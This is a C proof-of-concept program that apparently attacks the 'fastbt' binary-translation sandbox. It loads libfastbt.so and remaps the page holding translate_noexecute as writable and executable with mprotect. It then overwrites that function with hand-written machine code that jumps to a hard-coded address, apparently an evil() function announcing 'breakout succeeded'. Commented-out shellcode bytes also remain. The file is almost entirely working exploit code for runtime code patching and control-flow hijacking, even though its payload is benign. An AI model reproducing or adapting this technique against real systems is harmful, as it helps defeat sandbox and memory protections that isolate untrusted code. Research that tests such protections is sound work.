#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <unistd.h>

void evil()
{
 printf("breakout succeeded!\n");
 _exit(0);
}

int main()
{
 void *handle;
 void* (*func)(void*, void*);
 char *error;
 char *tmp;

 printf("main()\n");

 handle = dlopen("libfastbt.so", RTLD_LAZY);
 if(!handle)
 {
  fprintf (stderr, "%s\n", dlerror());
  exit(1);
 }

 dlerror();    /* Clear any existing error */

 func = dlsym(handle, "translate_noexecute");
 if ((error = dlerror()) != NULL)
 {
  fprintf (stderr, "%s\n", error);
  exit(1);
 }

 //printf ("%f\n", (*func)(arg, arg));
 printf("address of func is: %x\n", func);
 printf("pagesize: %i\n", sysconf(_SC_PAGESIZE));
 printf("aligned address: %x\n", (void*)((int)func & 0xffff0000));
 //exit(1)
 //$shellcode = "\x31\xdb\x89\xd8\x43\x40\xcd\x80";

 if(mprotect( (void*)((int)func & 0xfffff000),  sysconf(_SC_PAGESIZE), (PROT_READ | PROT_WRITE | PROT_EXEC))!=0)
 {
  perror("mprotect failed");
  exit(1);
 }

 // overwrite func code
 // 0x080486e4
 tmp = (char*)func;
/*
 *tmp++ = '\x31';
 *tmp++ = '\xdb';
 *tmp++ = '\x89';
 *tmp++ = '\xd8';
 *tmp++ = '\x43';
 *tmp++ = '\x40';
 *tmp++ = '\xcd';
 *tmp++ = '\x80';
*/

 *tmp++ = '\xb8';
 *tmp++ = '\xe4';
 *tmp++ = '\x86';
 *tmp++ = '\x04';
 *tmp++ = '\x08';
 *tmp++ = '\xff';
 *tmp++ = '\xd0';

 sleep(2);

 dlclose(handle);

 return 0;
}